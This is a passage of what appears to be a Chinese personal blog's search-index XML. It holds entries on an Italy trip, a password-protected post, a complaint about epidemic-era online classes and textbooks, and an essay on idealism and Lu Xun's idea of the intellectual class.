<h3 id="巨大的花园"><a class="markdownIt-Anchor" href="#巨大的花园"></a> 巨大的花园</h3>
<p><img src="/2020/02/29/Italy-memory/Italy18.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy19.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy20.jpg" alt></p>
<h3 id="佛罗伦萨"><a class="markdownIt-Anchor" href="#佛罗伦萨"></a> 佛罗伦萨</h3>
<p><img src="/2020/02/29/Italy-memory/Italy21.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy22.jpg" alt></p>
<h3 id="威尼斯"><a class="markdownIt-Anchor" href="#威尼斯"></a> 威尼斯</h3>
<p><img src="/2020/02/29/Italy-memory/Italy23.jpg" alt="威尼斯" title="威尼斯"></p>
<p><img src="/2020/02/29/Italy-memory/Italy24.jpg" alt="威尼斯" title="威尼斯"></p>
<p><img src="/2020/02/29/Italy-memory/Italy25.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy26.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy27.jpg" alt></p>
<h3 id="传说中罗密欧与朱丽叶相遇的地方"><a class="markdownIt-Anchor" href="#传说中罗密欧与朱丽叶相遇的地方"></a> 传说中罗密欧与朱丽叶相遇的地方</h3>
<p><img src="/2020/02/29/Italy-memory/Italy28.jpg" alt="传说中罗密欧与朱丽叶相遇的地方" title="传说中罗密欧与朱丽叶相遇的地方"></p>
]]></content>
      <categories>
        <category>旅行</category>
      </categories>
      <tags>
        <tag>旅行</tag>
      </tags>
  </entry>
  <entry>
    <title>庄颜、神仙姐姐与爱情幻想</title>
    <url>/2020/02/28/affection-illusion/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="19b06687cd633e9a29245b93a31ceabb917a909017b7e11b0a5f921dc9a55d94">974a10538692d123775750fa4cd57060c51ca00670dff0798dcebf9171161591d27e6e9ffde021ff9e7f762d001aa4c27698281cb13fe572aa3aba24792fe2e1ac28f6bc84f9e6a559096062249f63067bf1a08f600e6bbf366793e263514fb653c919a4852a3b6ad88924bec16a1a3c8890d700437a414c80e9ead39d13934708be39fc605e6b8999688cecdc7b5e20b9ba2cf524e7851e382991355692dca0f13cc4d3402f44e3e09a9a3725ea499a614ff270d970f6662eb2e69f1ca53a06b73786a7517e74b5e926fd2f3403eb030aee5edfc98c534a7657f5decca6e517bc9ecbd33d5f30f319f92b1f16af4ba9d65d0be3edf2b007d3ca6da25ba8a8c3babe67daf7bc319d0e86ca2102332944ef8750b35e9cb3093bc9b056c16d6a69</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>爱情</tag>
        <tag>人生</tag>
        <tag>杂论</tag>
      </tags>
  </entry>
  <entry>
    <title>家居学习语</title>
    <url>/2020/02/27/moan/</url>
    <content><![CDATA[<p>因为疫情的原因，我们国家的各个中学校、高等学府都开始了线上授课，即以直播或者以网课为途径进行授课。在我没开学的时候，我天真地以为，这次疫情的发展，也许会促进 教育在网络上的发展，使得我们今后的课程可以通过网络进行，由此可以扩展教育的普及度以及减少学生的教育负担。尤其是对于我这种只喜欢舒舒服服待在家里，受不了宿舍嘈杂环境的人， 简直是福音。可是当我灰溜溜地上完一周的线上课后，我才真心感觉到我那时的想法还是多么的天真。我们国家的网络教育事业，仍然是处于非常低水平，教育内容也是非常刻板与愚蠢的。</p>
<a id="more"></a>
<p>首先说我们的网课，我自己认为网课的内容简直是惨不忍睹，一套课程下来，只有一个老师在那里逐字地去念ppt，声调完全没有变化，就好像刻板的机器一样，知道的以为他在讲课，不知道的还以为 他在基督教堂里做弥撒。从他呆板的语调中我听不出这节课的任何重点。于是，在忍受了几天的课程终于受不了，就去自己看书自学，或者去其他的网站自己找课程学习。我当然并不反对每个学校录课， 为教育公开贡献一份自己的力量，不过有一句话叫做“陈力就列，不能则止”。</p>
<p>事实上，我认为一所名校，是完全有可能做好线上教育的行当的，不过我们的国情是学校都不大把教学放在心上，但偏偏又爱事事争先，看到哪个学校又推出了什么项目，我们便也想去模仿一下。 或者某个名校又有某个天才学生的加盟啦，美女教师评职称啦，学校就又会大力宣传一番，吸引看客的眼球，让一群不懂装懂的人评头论足。这些事情的发生，并非是我信口胡诌，你多少都能发现些 蛛丝马迹。</p>
<p>我是学计算机专业的，当我在网络上挑选书籍的时候，我总会挑选国外的计算机专业书籍。国内没有计算机专业书籍吗？不是！国内的计算机书籍稂莠不齐，虽然也有一些精品书籍，但大都是少数， 很多都是名词的罗列与概念的堆砌，更像是大学生毕业时写论文东抄抄西抄抄的感觉。我们的专业教材为什么如此不堪呢？是真的没有人可以写吗？并不是！我们有水平且有资格写教材的人大都是各个“名校” 的教授专家们，教育部把编写某个教材的人物分配给某个高校，学校又分配给学校内该领域的教授，但是教授呢，他可没那么多功夫写，他还要做科研呢！于是就把任务分配给自己课题下的研究生、博士生们， 研究生、博士生怎么办呢，人家还要毕业呢？可是水平不够怎么办呢？那就抄吧！那好抄抄哪，但为了避免查重，一个专题还得换着书抄，如此作为，书的质量能好得了吗？</p>
<p>我认为之所以我们国家出不了经典的教材，出不了适合国人的教育课程，根本原因就是教育体系的评判方式有问题，中国的教师只能靠科研或者搞学术获得晋升，而不能通过教课来评职称。 为什么我们中小学教育在全世界属于领先水平，但是高等教育却被诟病呢？其实质就是中小学教育教师是全职教课的，而在高等学府教师的晋升之道就只有搞学术一条，这样教师又怎能有大把精力来考虑 教学问题呢？</p>
<p>还记得14年的时候四川大学历史讲师周鼎发的那篇<a href="solo.html">《自白书》</a>吗？若非如此，教授们又怎会将自己“著作等身”的东西弃如敝履呢？</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>理想的知识阶级</title>
    <url>/2020/02/27/ideal-political/</url>
    <content><![CDATA[<p>我一直认为自己是一个理想主义者，我喜欢读历史，读文学，喜欢听音乐，我喜欢同别人交谈却很少可以找到知心的人，我把这件事归于我的理想化， 我对于我的理想充满了向往，却又不断地做出妥协，虽然如今我认为“妥协”是人在社会上生存的本能,却又不甘心去做一个永远“妥协”的人。</p>
<a id="more"></a>
<p>我在这个寒假看了很多电影，尤其是韩国电影，像李沧东的《燃烧》、《薄荷糖》，奉俊昊的《杀人回忆》、《寄生虫》,还有像《辩护人》等， 这些电影无论是从艺术处理还是从深度上自然都是极好的，尤其是对于韩国民主化进程的反思以及对于那代人所带来的灾难性发展。可我认为， 仅仅有道德上的批判是不够的，缓慢地变革是不彻底的，光荣革命、辛亥革命都是阉割了的革命。</p>
<p>前今天和朋友聊人生的时候，我就说：“等我以后赚够了钱，就隐居山林，开个咖啡馆或者书店，做自己喜欢做的事情，如果还有余力的话，就去 旅游，见识世界的山水人情。”然后，我又自嘲地说，我是不是太过理想了，在一个社会中，什么人可以自由自在地过完自己的一生呢？每个人都要受社会、 家庭、欲望等等因素的羁绊，自古皆然。也许当我有幸可以达到我现在所需要的条件的时候，我就又往更远的地方看了呢。</p>
<p>近些日子来，中国爆发了数十年来从未见过的“瘟疫”，我看到了许许多多丑恶与善良的事情，也听到了消极或积极的声音。我不对于这些事情予以置评， 因为我从未亲身经历过这些事情，而没有经历过同样事情的人是没有资格对一件事情发出评论的；我也不是批评家，我没有那么好的文笔和蛊惑性，我只是想把 我看到的，思考过的，读过的，说过的记录下来，呈现给大家，或许你会认为这篇文章杂乱无章，一点没有可读性。我认为这本身是对的，因为事情就是这么乱， 我只是把我想到的全部写出来。当我看历史的时候，我会感到痛心，因为我看到了在历史舞台上叱咤风云的人物竟然也会如此平庸，我们也一样，如此平庸。</p>
<p>前些日子读到鲁迅先生的一篇杂文<a href="https://www.marxists.org/chinese/reference-books/luxun/24/045.htm">《关于知识阶级》</a> ，说实话，我真的觉得这是我本年度读的，甚至可以说是有生以来读的最优秀的杂文，在这里他提出了一个“真的知识阶级”，并且做了两点界定，“他与平民接近，或 自身就是平民”，“因此他确能为平民抱不平，把平民的苦痛告诉大众”；“他们对社会永不会满意的，所感受的永远是痛苦，所看到的永远是缺点”，它所强调的是，真正 的知识阶级，是要永远站到平民阶级这边的，所谓平民阶级，不是某一个人，也不是某一个团体，因为某一个人或者某一个团体，都有可能在历史的进程中实现阶级的转换， 而真正的知识阶级，则是要坚持拥护在易受到倾轧的团体的这边，否则，就会变成“革命奸商”，“革命小贩”，“革命工头”与“奴隶总管”。鲁迅对被压迫的民众的反抗的合理性， 是从不怀疑的，他有句名言，“人被压迫了，为什么不斗争？”，正是怀着这种对于底层阶级深刻的同情，他后来对当时中国唯一反抗国民党一党专政的共产党领导的工农革命运动， 采取同情与支持的态度，并且与共产党人合作，共同发起左翼文艺运动，都是一种自觉的选择。当他目睹年轻的革命文学者为了自己的争取民众解放的信仰不惜流血牺牲，更是用 少有的热情由衷地赞叹“无产阶级革命文学和革命的劳苦大众是在受一样的压迫，一样的残杀，做一样的战斗，有一样的运命”，这与前述站在普通民众这一边，做永远的革命者的“ 真的知识阶级”的定位，是完全一致的。或者可以说，一个真的知识阶级几乎是必然要做这样的选择的。</p>
<p>然而值得一提的是关于“党的左翼”与“鲁迅左翼”，到了三十年代中后期，面对日本侵略，中国共产党改变策略，主张建立民族统一战线，在文学上，提出“国防文学”的口号。 鲁迅对“国防文学”口号并不反对，但是有点担心，如果过分地强调国家利益至上，会不会掩盖或者美化国民党一党专政的统治？会不会因此损害工农民众的基本利益？他有这样的担心，就提出 另外一个口号“民族革命时代的大众文学”，强调战争的革命性，要维护大众的利益，就要坚持他的左翼立场。</p>
<p>另一件事是许广平在1927年国共合作时，曾经有过加入国民党的想法，她征求鲁迅的意见，鲁迅就对她说，一个政党是要靠组织力量来实现它的理想、信念的，所以政党是要强调纪律性的， 要求党员绝对服从政党的决议，有的时候就要牺牲个人意志。因此要求你入党，就必须想清楚，你是否愿意在一定条件下牺牲个人意志，如果愿意就加入，如果不愿意，要保持个人意志和独立性， 就别加入。这是鲁迅的个体精神，这也是鲁迅左翼与党的左翼的根本性分歧。</p>
<p>所以我们现在回头来看看，什么是真正的理想主义？像我从前所想那样，只顾着自己的自由与快活，大概是算不上真正的理想主义的，因为如此的“理想”，是无法去实现的。真正的理想主义， 更是应当去立足于实际，对于一切具有批判性思维与探索欲，这是“理想的知识阶级”。再理想的东西，也应当有其实际意义与实际用处，而非一味的空穴来风。</p>
<p>我读《北洋军阀史》的时候，就发现孙文这个真正的理想主义者，却被整个大环境给搞偏了，以至于在袁世凯在北京就任大总统后，孙文因为太过理想而被孤立，整个同盟会也土崩瓦解，形成了 国民党、民主党、共和党等等，尤其自从唐绍仪内阁瓦解后，原来的政党内阁成为了内阁政党，从而变成了袁世凯攫取权力的工具。这是因为辛亥革命从一开始便是不彻底的，当革命军达到一定规模时， 同盟会成员想的不是如何从内部推举首领，反而邀请封建名流及政治家如黎元洪等担任首领，这便是没有真正地深入到国民中去。</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>杂论</tag>
      </tags>
  </entry>
</search>
